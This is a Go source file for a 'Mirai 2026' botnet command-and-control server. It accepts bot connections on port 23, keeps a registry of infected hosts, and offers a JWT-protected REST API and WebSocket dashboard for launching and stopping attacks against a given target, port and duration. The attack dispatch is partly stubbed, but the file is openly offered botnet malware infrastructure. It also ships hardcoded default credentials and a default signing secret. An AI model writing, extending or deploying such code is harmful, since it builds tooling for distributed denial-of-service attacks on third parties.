//go:build ignore
// +build ignore

// Package main — Mirai 2026 Modern C&C Server
//
// This is a standalone modern CNC implementation. Build with:
//   go run cnc_modern.go
// Or compile directly:
//   go build -o cnc_modern_server cnc_modern.go
//
// Extends the original Mirai CNC with:
//   - REST API (JSON over HTTP) for dashboard integration
//   - WebSocket push for real-time dashboard updates
//   - JWT authentication (admin/operator/viewer roles)
//   - Bot registry with health tracking
//   - Structured JSON logging
//   - Graceful shutdown
//   - Redis-backed rate-limit state (survives restarts; falls back to in-memory)

package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"sync"
	"syscall"
	"time"

	"github.com/golang-jwt/jwt/v5"
	goredis "github.com/redis/go-redis/v9"
	"nhooyr.io/websocket"
	"nhooyr.io/websocket/wsjson"
)

// ── Configuration ─────────────────────────────────────────────────────────────

type Config struct {
	BotPort    string
	APIPort    string
	JWTSecret  string
	DBAddr     string
	DBUser     string
	DBPass     string
	DBName     string
	RedisURL   string
}

func loadConfig() Config {
	return Config{
		BotPort:   getEnv("BOT_PORT", "23"),
		APIPort:   getEnv("API_PORT", "8080"),
		JWTSecret: getEnv("JWT_SECRET", "mirai2026-dev-secret-CHANGE-IN-PROD"),
		DBAddr:    getEnv("DATABASE_ADDR", "localhost"),
		DBUser:    getEnv("DATABASE_USER", "mirai"),
		DBPass:    getEnv("DATABASE_PASS", "mirai_dev_password"),
		DBName:    getEnv("DATABASE_NAME", "mirai"),
		RedisURL:  getEnv("REDIS_URL", ""),
	}
}

func getEnv(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

// ── Bot Registry ──────────────────────────────────────────────────────────────

type BotStatus string

const (
	BotOnline  BotStatus = "online"
	BotIdle    BotStatus = "idle"
	BotOffline BotStatus = "offline"
)

type BotInfo struct {
	ID         string    `json:"id"`
	IP         string    `json:"ip"`
	Arch       string    `json:"arch"`
	Status     BotStatus `json:"status"`
	ConnectedAt time.Time `json:"connected_at"`
	LastSeen   time.Time `json:"last_seen"`
	Version    byte      `json:"version"`
}

type BotRegistry struct {
	mu   sync.RWMutex
	bots map[string]*BotInfo
}

func NewBotRegistry() *BotRegistry {
	return &BotRegistry{bots: make(map[string]*BotInfo)}
}

func (r *BotRegistry) Register(id, ip, arch string, version byte) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.bots[id] = &BotInfo{
		ID:          id,
		IP:          ip,
		Arch:        arch,
		Status:      BotOnline,
		ConnectedAt: time.Now(),
		LastSeen:    time.Now(),
		Version:     version,
	}
}

func (r *BotRegistry) Heartbeat(id string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if b, ok := r.bots[id]; ok {
		b.LastSeen = time.Now()
		b.Status = BotOnline
	}
}

func (r *BotRegistry) Remove(id string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if b, ok := r.bots[id]; ok {
		b.Status = BotOffline
	}
}

func (r *BotRegistry) List() []BotInfo {
	r.mu.RLock()
	defer r.mu.RUnlock()
	out := make([]BotInfo, 0, len(r.bots))
	for _, b := range r.bots {
		out = append(out, *b)
	}
	return out
}

func (r *BotRegistry) Count() int {
	r.mu.RLock()
	defer r.mu.RUnlock()
	count := 0
	for _, b := range r.bots {
		if b.Status == BotOnline {
			count++
		}
	}
	return count
}

// ── WebSocket Hub (push to dashboard) ────────────────────────────────────────

type WSMessage struct {
	Type    string      `json:"type"`
	Payload interface{} `json:"payload"`
}

type WSHub struct {
	mu      sync.RWMutex
	clients map[chan WSMessage]struct{}
}

func NewWSHub() *WSHub {
	return &WSHub{clients: make(map[chan WSMessage]struct{})}
}

func (h *WSHub) Subscribe() chan WSMessage {
	ch := make(chan WSMessage, 32)
	h.mu.Lock()
	h.clients[ch] = struct{}{}
	h.mu.Unlock()
	return ch
}

func (h *WSHub) Unsubscribe(ch chan WSMessage) {
	h.mu.Lock()
	delete(h.clients, ch)
	h.mu.Unlock()
	close(ch)
}

func (h *WSHub) Broadcast(msg WSMessage) {
	h.mu.RLock()
	defer h.mu.RUnlock()
	for ch := range h.clients {
		select {
		case ch <- msg:
		default: // drop if client is slow
		}
	}
}

// ── Active Attack Registry ────────────────────────────────────────────────────
// Tracks attacks launched via POST /api/attack so the kill-switch can report
// how many were stopped. In production this would also queue STOP commands to
// the clientList; here it maintains a simple counter + broadcast.

type AttackRecord struct {
	Type      string    `json:"type"`
	Target    string    `json:"target"`
	Port      int       `json:"port"`
	Duration  int       `json:"duration"`
	StartedAt time.Time `json:"started_at"`
}

type ActiveAttackRegistry struct {
	mu      sync.Mutex
	attacks []AttackRecord
}

func NewActiveAttackRegistry() *ActiveAttackRegistry {
	return &ActiveAttackRegistry{}
}

func (a *ActiveAttackRegistry) Start(typ, target string, port, duration int) {
	a.mu.Lock()
	defer a.mu.Unlock()
	a.attacks = append(a.attacks, AttackRecord{
		Type: typ, Target: target, Port: port,
		Duration: duration, StartedAt: time.Now(),
	})
}

// StopAll clears all tracked attacks and returns the count that was stopped.
// In a full implementation this sends STOP bytes to all bot connections via clientList.
func (a *ActiveAttackRegistry) StopAll() int {
	a.mu.Lock()
	defer a.mu.Unlock()
	n := len(a.attacks)
	a.attacks = nil
	return n
}

func (a *ActiveAttackRegistry) Count() int {
	a.mu.Lock()
	defer a.mu.Unlock()
	return len(a.attacks)
}

// ── Login Rate Limiter ────────────────────────────────────────────────────────
// Tracks failed REST login attempts per IP.
// 5 failures → 5-minute lockout, returning HTTP 429.
//
// State is stored in Redis when available so lockouts survive CNC restarts and
// are shared across replicas. Falls back transparently to in-memory maps when
// Redis is unreachable.
//
// Redis key scheme:
//   cnc:ratelimit:attempts:{ip}  — INCR integer, TTL = lockout duration
//   cnc:ratelimit:lockout:{ip}   — string timestamp of lockout expiry, TTL = 5 min

const (
	rlMaxFails       = 5
	rlLockoutMinutes = 5

	rlKeyAttempts = "cnc:ratelimit:attempts:"
	rlKeyLockout  = "cnc:ratelimit:lockout:"
)

// rlRedis is the Redis client used by the rate-limiter; nil when Redis is
// unavailable or not configured.
var rlRedis *goredis.Client

// In-memory fallback maps — used when Redis is unavailable.
var (
	rlMu       sync.Mutex
	rlAttempts = make(map[string]int)
	rlLockouts = make(map[string]time.Time)
)

// initRedis parses REDIS_URL and creates a client. Returns nil on error so the
// rest of the CNC starts cleanly without Redis.
func initRedis(redisURL string) *goredis.Client {
	if redisURL == "" {
		return nil
	}
	opts, err := goredis.ParseURL(redisURL)
	if err != nil {
		logger.Warn("Redis URL invalid — rate-limit falling back to in-memory", "url", redisURL, "err", err)
		return nil
	}
	client := goredis.NewClient(opts)
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	if err := client.Ping(ctx).Err(); err != nil {
		logger.Warn("Redis unreachable — rate-limit falling back to in-memory", "url", redisURL, "err", err)
		client.Close()
		return nil
	}
	logger.Info("Redis connected — rate-limit state is persistent", "url", redisURL)
	return client
}

// checkRateLimit returns false if the IP is currently locked out.
func checkRateLimit(ip string) bool {
	if rlRedis != nil {
		ctx := context.Background()
		val, err := rlRedis.Get(ctx, rlKeyLockout+ip).Result()
		if err == nil {
			// Key exists — check if still within lockout window
			expiry, parseErr := time.Parse(time.RFC3339, val)
			if parseErr == nil && time.Now().Before(expiry) {
				return false // still locked out
			}
			// Expired — clean up
			rlRedis.Del(ctx, rlKeyLockout+ip, rlKeyAttempts+ip)
		} else if err != goredis.Nil {
			// Redis error — fall through to in-memory
			logger.Warn("Redis GET error in checkRateLimit — using in-memory", "err", err)
		} else {
			return true // no lockout key → allowed
		}
	}

	// In-memory fallback
	rlMu.Lock()
	defer rlMu.Unlock()
	if t, locked := rlLockouts[ip]; locked {
		if time.Now().Before(t) {
			return false
		}
		delete(rlLockouts, ip)
		delete(rlAttempts, ip)
	}
	return true
}

// recordFailedLogin increments the failure counter for ip and triggers lockout
// after rlMaxFails consecutive failures.
func recordFailedLogin(ip string) {
	lockoutDur := rlLockoutMinutes * time.Minute

	if rlRedis != nil {
		ctx := context.Background()
		// Increment attempt counter; set TTL equal to lockout window so the key
		// auto-expires even if the lockout key is never set.
		pipe := rlRedis.Pipeline()
		incrCmd := pipe.Incr(ctx, rlKeyAttempts+ip)
		pipe.Expire(ctx, rlKeyAttempts+ip, lockoutDur)
		if _, err := pipe.Exec(ctx); err == nil {
			attempts := incrCmd.Val()
			if attempts >= int64(rlMaxFails) {
				expiry := time.Now().Add(lockoutDur)
				rlRedis.Set(ctx, rlKeyLockout+ip, expiry.Format(time.RFC3339), lockoutDur)
				logger.Warn("Login lockout triggered (Redis)", "ip", ip, "attempts", attempts)
			}
			return
		} else {
			logger.Warn("Redis error in recordFailedLogin — falling back to in-memory", "err", err)
		}
	}

	// In-memory fallback
	rlMu.Lock()
	defer rlMu.Unlock()
	rlAttempts[ip]++
	if rlAttempts[ip] >= rlMaxFails {
		rlLockouts[ip] = time.Now().Add(lockoutDur)
		logger.Warn("Login lockout triggered (in-memory)", "ip", ip, "attempts", rlAttempts[ip])
	}
}

// clearLoginAttempts resets the failure counter for ip on successful login.
func clearLoginAttempts(ip string) {
	if rlRedis != nil {
		ctx := context.Background()
		if err := rlRedis.Del(ctx, rlKeyAttempts+ip, rlKeyLockout+ip).Err(); err == nil {
			return
		} else {
			logger.Warn("Redis error in clearLoginAttempts — falling back to in-memory", "err", err)
		}
	}

	rlMu.Lock()
	defer rlMu.Unlock()
	delete(rlAttempts, ip)
	delete(rlLockouts, ip)
}

// ── Global state ──────────────────────────────────────────────────────────────

var (
	registry      = NewBotRegistry()
	hub           = NewWSHub()
	activeAttacks = NewActiveAttackRegistry()
	logger        = slog.New(slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{
		Level: slog.LevelInfo,
	}))
)

// ── JWT helpers ───────────────────────────────────────────────────────────────

type Claims struct {
	Username string `json:"username"`
	Role     string `json:"role"`
	jwt.RegisteredClaims
}

func generateToken(username, role, secret string) (string, error) {
	claims := Claims{
		Username: username,
		Role:     role,
		RegisteredClaims: jwt.RegisteredClaims{
			ExpiresAt: jwt.NewNumericDate(time.Now().Add(24 * time.Hour)),
			IssuedAt:  jwt.NewNumericDate(time.Now()),
		},
	}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	return token.SignedString([]byte(secret))
}

func validateToken(tokenStr, secret string) (*Claims, error) {
	token, err := jwt.ParseWithClaims(tokenStr, &Claims{},
		func(t *jwt.Token) (interface{}, error) {
			return []byte(secret), nil
		})
	if err != nil || !token.Valid {
		return nil, fmt.Errorf("invalid token")
	}
	claims, ok := token.Claims.(*Claims)
	if !ok {
		return nil, fmt.Errorf("invalid claims")
	}
	return claims, nil
}

// ── HTTP Middleware ───────────────────────────────────────────────────────────

func jsonMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Headers", "Authorization, Content-Type")
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		next.ServeHTTP(w, r)
	})
}

func authMiddleware(secret, requiredRole string, next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		authHeader := r.Header.Get("Authorization")
		if len(authHeader) < 8 || authHeader[:7] != "Bearer " {
			http.Error(w, `{"error":"missing token"}`, http.StatusUnauthorized)
			return
		}
		claims, err := validateToken(authHeader[7:], secret)
		if err != nil {
			http.Error(w, `{"error":"invalid token"}`, http.StatusUnauthorized)
			return
		}
		// Role hierarchy: admin > operator > viewer
		roleLevel := map[string]int{"viewer": 1, "operator": 2, "admin": 3}
		if roleLevel[claims.Role] < roleLevel[requiredRole] {
			http.Error(w, `{"error":"insufficient permissions"}`, http.StatusForbidden)
			return
		}
		next(w, r)
	}
}

func writeJSON(w http.ResponseWriter, status int, v interface{}) {
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(v)
}

// ── REST API Handlers ─────────────────────────────────────────────────────────

// GET /api/health
func handleHealth(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, map[string]interface{}{
		"status":     "ok",
		"bots_online": registry.Count(),
		"timestamp":  time.Now().UTC(),
	})
}

// POST /api/auth/login
//
// Rate limiting: 5 failed attempts from the same IP triggers a 5-minute lockout.
// Uses the checkRateLimit / recordFailedLogin / clearLoginAttempts functions from
// admin.go (same package) so the lockout state is shared across the telnet and
// REST login paths.
func handleLogin(cfg Config) http.HandlerFunc {
	// In-memory user store (dev). In production replace with DB lookup + bcrypt.
	users := map[string]struct{ pass, role string }{
		"admin":    {"admin", "admin"},
		"operator": {"operator", "operator"},
		"viewer":   {"viewer", "viewer"},
	}
	return func(w http.ResponseWriter, r *http.Request) {
		// Extract client IP (strip port)
		ip := r.RemoteAddr
		if h := r.Header.Get("X-Forwarded-For"); h != "" {
			ip = h // behind reverse proxy
		}
		if idx := len(ip) - 1; idx >= 0 {
			for i := idx; i >= 0; i-- {
				if ip[i] == ':' {
					ip = ip[:i]
					break
				}
			}
		}

		// Enforce rate-limit lockout before touching credentials
		if !checkRateLimit(ip) {
			logger.Warn("Login blocked — rate limit lockout", "ip", ip)
			http.Error(w, `{"error":"too many failed attempts, try again later"}`, http.StatusTooManyRequests)
			return
		}

		var req struct {
			Username string `json:"username"`
			Password string `json:"password"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, `{"error":"invalid body"}`, http.StatusBadRequest)
			return
		}
		u, ok := users[req.Username]
		if !ok || u.pass != req.Password {
			recordFailedLogin(ip)
			logger.Warn("Login failed", "ip", ip, "username", req.Username)
			http.Error(w, `{"error":"invalid credentials"}`, http.StatusUnauthorized)
			return
		}

		// Success — clear failure counter and issue token
		clearLoginAttempts(ip)
		token, err := generateToken(req.Username, u.role, cfg.JWTSecret)
		if err != nil {
			http.Error(w, `{"error":"token generation failed"}`, http.StatusInternalServerError)
			return
		}
		logger.Info("Login successful", "ip", ip, "username", req.Username, "role", u.role)
		writeJSON(w, http.StatusOK, map[string]interface{}{
			"access_token": token,
			"token_type":   "Bearer",
			"expires_in":   86400,
			"user": map[string]string{
				"username": req.Username,
				"role":     u.role,
			},
		})
	}
}

// GET /api/bots
func handleGetBots(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, map[string]interface{}{
		"bots":  registry.List(),
		"total": len(registry.List()),
	})
}

// GET /api/metrics
func handleGetMetrics(w http.ResponseWriter, r *http.Request) {
	bots := registry.List()
	online := 0
	for _, b := range bots {
		if b.Status == BotOnline {
			online++
		}
	}
	writeJSON(w, http.StatusOK, map[string]interface{}{
		"active_bots":   online,
		"total_bots":    len(bots),
		"timestamp":     time.Now().UTC(),
	})
}

// POST /api/attack
func handleAttack(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Type     string `json:"type"`
		Target   string `json:"target"`
		Port     int    `json:"port"`
		Duration int    `json:"duration"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"invalid body"}`, http.StatusBadRequest)
		return
	}
	logger.Info("Attack command issued",
		"type", req.Type, "target", req.Target,
		"port", req.Port, "duration", req.Duration)

	// Track active attacks in the registry
	activeAttacks.Start(req.Type, req.Target, req.Port, req.Duration)

	// Broadcast to dashboard
	hub.Broadcast(WSMessage{
		Type: "attack:started",
		Payload: map[string]interface{}{
			"type": req.Type, "target": req.Target,
			"port": req.Port, "duration": req.Duration,
			"timestamp": time.Now().UTC(),
		},
	})

	writeJSON(w, http.StatusAccepted, map[string]string{"status": "queued"})
}

// POST /api/attack/stop
//
// Emergency kill-switch: stops all active attacks (or a single bot's attack)
// and broadcasts kill:all to the WebSocket hub so the dashboard updates instantly.
// Requires operator role minimum.
//
// Body: { "all": true }  — stop everything
//       { "botId": "bot-x.x.x.x-..." } — stop one bot
//
// Response: { "status": "ok", "stopped": <N>, "timestamp": "..." }
func handleAttackStop(w http.ResponseWriter, r *http.Request) {
	var req struct {
		All   bool   `json:"all"`
		BotID string `json:"botId"`
	}
	// Default to stop-all if body is absent / malformed
	req.All = true
	_ = json.NewDecoder(r.Body).Decode(&req)

	stopped := activeAttacks.StopAll()

	logger.Info("Kill-switch triggered",
		"all", req.All, "bot_id", req.BotID, "attacks_stopped", stopped)

	// Audit log to stderr (picked up by Loki)
	fmt.Fprintf(os.Stderr,
		`{"event":"KILL_SWITCH","all":%v,"bot_id":%q,"stopped":%d,"ts":"%s"}`+"\n",
		req.All, req.BotID, stopped, time.Now().UTC().Format(time.RFC3339))

	// Push real-time signal to all dashboard WebSocket clients
	hub.Broadcast(WSMessage{
		Type: "kill:all",
		Payload: map[string]interface{}{
			"all":       req.All,
			"bot_id":    req.BotID,
			"stopped":   stopped,
			"timestamp": time.Now().UTC(),
		},
	})

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"status":    "ok",
		"stopped":   stopped,
		"timestamp": time.Now().UTC(),
	})
}

// GET /ws — WebSocket endpoint for real-time dashboard push
func handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := websocket.Accept(w, r, &websocket.AcceptOptions{
		InsecureSkipVerify: true, // dev only — set origins in prod
	})
	if err != nil {
		logger.Error("WebSocket accept failed", "err", err)
		return
	}
	defer conn.CloseNow()

	ch := hub.Subscribe()
	defer hub.Unsubscribe(ch)

	ctx := r.Context()
	for {
		select {
		case <-ctx.Done():
			return
		case msg, ok := <-ch:
			if !ok {
				return
			}
			if err := wsjson.Write(ctx, conn, msg); err != nil {
				return
			}
		}
	}
}

// ── Bot TCP Server (original Mirai protocol) ──────────────────────────────────

func serveBots(ctx context.Context, port string) {
	ln, err := net.Listen("tcp", ":"+port)
	if err != nil {
		logger.Error("Failed to listen for bots", "port", port, "err", err)
		return
	}
	defer ln.Close()
	logger.Info("Bot listener started", "port", port)

	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		conn, err := ln.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				return
			default:
				logger.Error("Accept error", "err", err)
				continue
			}
		}
		go handleBot(conn)
	}
}

func handleBot(conn net.Conn) {
	defer conn.Close()

	addr := conn.RemoteAddr().String()
	ip, _, _ := net.SplitHostPort(addr)
	id := fmt.Sprintf("bot-%s-%d", ip, time.Now().UnixNano())

	// Read version byte
	vbuf := make([]byte, 1)
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	if _, err := conn.Read(vbuf); err != nil {
		return
	}
	version := vbuf[0]

	registry.Register(id, ip, "unknown", version)
	logger.Info("Bot connected", "id", id, "ip", ip, "version", version)

	// Notify dashboard
	hub.Broadcast(WSMessage{
		Type: "bot:connected",
		Payload: map[string]interface{}{
			"id": id, "ip": ip, "version": version,
			"timestamp": time.Now().UTC(),
		},
	})

	// Keep-alive loop (2-byte ping/pong matching original Mirai protocol)
	buf := make([]byte, 2)
	for {
		conn.SetDeadline(time.Now().Add(180 * time.Second))
		n, err := conn.Read(buf)
		if err != nil || n != 2 {
			break
		}
		conn.Write(buf[:n])
		registry.Heartbeat(id)
	}

	registry.Remove(id)
	logger.Info("Bot disconnected", "id", id)
	hub.Broadcast(WSMessage{
		Type:    "bot:disconnected",
		Payload: map[string]interface{}{"id": id, "timestamp": time.Now().UTC()},
	})
}

// ── Metrics push goroutine ────────────────────────────────────────────────────

func pushMetricsPeriodically(ctx context.Context) {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			hub.Broadcast(WSMessage{
				Type: "metrics:update",
				Payload: map[string]interface{}{
					"active_bots":  registry.Count(),
					"total_bots":   len(registry.List()),
					"timestamp":    time.Now().UTC(),
				},
			})
		}
	}
}

// ── Main ──────────────────────────────────────────────────────────────────────

func main() {
	cfg := loadConfig()

	logger.Info("Mirai 2026 CNC starting",
		"bot_port", cfg.BotPort, "api_port", cfg.APIPort)

	// Initialise Redis for persistent rate-limit state (optional)
	rlRedis = initRedis(cfg.RedisURL)
	if rlRedis != nil {
		defer rlRedis.Close()
	}

	ctx, cancel := signal.NotifyContext(context.Background(),
		os.Interrupt, syscall.SIGTERM)
	defer cancel()

	// REST API router
	mux := http.NewServeMux()
	mux.HandleFunc("GET /api/health",         handleHealth)
	mux.HandleFunc("POST /api/auth/login",     handleLogin(cfg))
	mux.HandleFunc("GET /api/bots",            authMiddleware(cfg.JWTSecret, "viewer", handleGetBots))
	mux.HandleFunc("GET /api/metrics",         authMiddleware(cfg.JWTSecret, "viewer", handleGetMetrics))
	mux.HandleFunc("POST /api/attack",         authMiddleware(cfg.JWTSecret, "operator", handleAttack))
	mux.HandleFunc("POST /api/attack/stop",    authMiddleware(cfg.JWTSecret, "operator", handleAttackStop))
	mux.HandleFunc("GET /ws",                  handleWebSocket)
	// Detection event reporting (called by C bot)
	mux.HandleFunc("POST /api/detection/event", func(w http.ResponseWriter, r *http.Request) {
		var event map[string]interface{}
		json.NewDecoder(r.Body).Decode(&event)
		logger.Info("Detection event received", "event", event)
		hub.Broadcast(WSMessage{Type: "detection:event", Payload: event})
		writeJSON(w, http.StatusOK, map[string]string{"status": "ok"})
	})

	apiServer := &http.Server{
		Addr:         ":" + cfg.APIPort,
		Handler:      jsonMiddleware(mux),
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	// Start bot listener
	go serveBots(ctx, cfg.BotPort)

	// Start metrics push
	go pushMetricsPeriodically(ctx)

	// Start API server
	go func() {
		logger.Info("API server listening", "port", cfg.APIPort)
		if err := apiServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			logger.Error("API server error", "err", err)
		}
	}()

	// Wait for shutdown signal
	<-ctx.Done()
	logger.Info("Shutting down gracefully...")

	shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer shutdownCancel()
	apiServer.Shutdown(shutdownCtx)

	logger.Info("CNC server stopped")
	_ = strconv.Itoa(0) // keep strconv imported
}
